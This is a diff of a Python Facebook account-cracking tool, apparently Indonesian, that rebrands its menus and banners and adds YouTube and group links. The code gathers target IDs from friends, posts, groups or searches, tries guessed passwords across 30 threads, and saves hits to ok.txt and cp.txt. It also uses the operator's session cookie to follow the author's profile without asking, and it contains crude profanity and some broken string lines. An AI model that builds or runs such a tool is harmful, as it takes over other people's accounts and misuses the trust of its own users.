@@ -1,4 +1,11 @@
-#anjing
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#Males gw encrypt Tod jika mau recode, recode aja
+#Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
+#Code by YayanXD 
+#Created 05-07-2020
+#My facebook (https://www.facebook.com/KM39453)
+
 import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
 from concurrent.futures import ThreadPoolExecutor
@@ -14,17 +21,43 @@ def aahh(s):
         time.sleep(1./300)
 def kontol():
     time.sleep(0.3)
+    aahh("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
+     ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
+     ██║     ██████╔╝███████║██║     █████╔╝ 
+\x1b[1;97m     ██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
+     ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
+\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
+\x1b[1;94m────────────────────────────────────────────────────
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : YayanXD
+\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Yayan-XD
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/KM39453
+\x1b[1;94m────────────────────────────────────────────────────""")
 
+def jembut():
+    print("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
+     ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
+     ██║     ██████╔╝███████║██║     █████╔╝ 
+\x1b[1;97m     ██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
+     ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
+\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
+\x1b[1;94m────────────────────────────────────────────────────
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : YayanXD
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/Yayan-XD
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/KM39453
+\x1b[1;94m────────────────────────────────────────────────────""")
 
-def ehankih():
+def yayanxd():
     yayan=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
     if yayan == "": 
-       os.system("python CRACK.py")
+       os.system("python Cr4ck.py")
     else:
        sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
-def ehan-kih():
+def moch_yayan():
     time.sleep(0.1)
     print("\033[97m [\033[96m01\033[97m] Start  Cr4ck ID")
+    print("\033[97m [\033[96m02\033[97m] Tutor  How to Get Fb Cookies")
+    print("\033[97m [\033[96m03\033[97m] Joined Grup Fb ❤️ RATU ERROR ❤️")
+    print("\033[97m [\033[96m04\033[97m] Joined Grup Fb Viral")
     print("\033[97m [\033[96m05\033[97m] Update Tools")
     print("\033[97m [\033[91m00\033[97m] Exit")
     print("\x1b[1;94m────────────────────────────────────────────────────")
@@ -62,17 +95,17 @@ def ehan-kih():
                            except:
                                   pass
                      try:
-                             ikuti = parser(requests.get(mbasic.format("/"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ikuti = parser(requests.get(mbasic.format("/KM39453"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
                      return cek["cookie"]
                      aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
              else:
-                  os.system("xdg-open 
+                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
-                  os.system('python CRACK.py')
+                  os.system('python Cr4ck.py')
          def login(username,password,cek=False):
              global die,check,result,count
              b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
@@ -177,23 +210,23 @@ def ehan-kih():
                    kuki = {'cookie':kukis}
                    ikeh_ikeh_kimochi()
                    kontol()
-                   crack dari teman')
-                   crack dari post/like?')
-                   crack dari mencari nama?')
-                   crack dari grup?')
-                   crack dari teman publik?')
-                   Lihat dari hasil crack'?)
-                   hapus cookies?')
-                   keluar?')
+                   aahh('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
+                   aahh('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
+                   aahh('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
+                   aahh('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
+                   aahh('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
+                   aahh('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
+                   aahh('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
+                   aahh('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
                    print('\x1b[1;94m────────────────────────────────────────────────────')
                    memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                    if memek =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
-                         ehan()
+                         yayanxd()
                    elif memek == '0' or memek =='00':
                          aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
-                        
-                           exit()                   	
+                         os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
+                         exit()                   	
                    elif memek == '7' or memek =='07':
                          print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mPlease Wait... ")
                          aahh("\x1b[1;92m • 10")
@@ -273,8 +306,8 @@ def ehan-kih():
                    ikeh_ikeh_kimochi()
                    jembut()
                    print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;95m     __________________________________________
-                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     __________________________\n",end="")       
+                   print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
+                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
@@ -282,8 +315,8 @@ def ehan-kih():
                    ikeh_ikeh_kimochi()
                    jembut()
                    print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;97m     _____________________________________
-                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     ____疊\n",end="")
+                   print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
+                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
                    print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                    print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
@@ -312,13 +345,13 @@ def ehan-kih():
                        exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")
 
     elif yayan == "2" or yayan =="02":
-         os.system("xdg-open 
+         os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
          yayanxd()
     elif yayan == "3" or yayan =="03":
-         os.system('xdg-open 
+         os.system('xdg-open https://www.facebook.com/groups/271952186154338')
          yayanxd()
     elif yayan == "4" or yayan =="04":
-         os.system('xdg-open 
+         os.system('xdg-open https://www.facebook.com/groups/310605552656196')
          yayanxd()
     elif yayan == "5" or yayan =="05":
          print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
@@ -329,3 +362,11 @@ def ehan-kih():
          aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
          os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
          exit()                   	
+
+if __name__=="__main__":
+     ikeh_ikeh_kimochi()
+     croot()
+     ikeh_ikeh_kimochi()
+     kontol()
+     moch_yayan()
+     yayanxd()
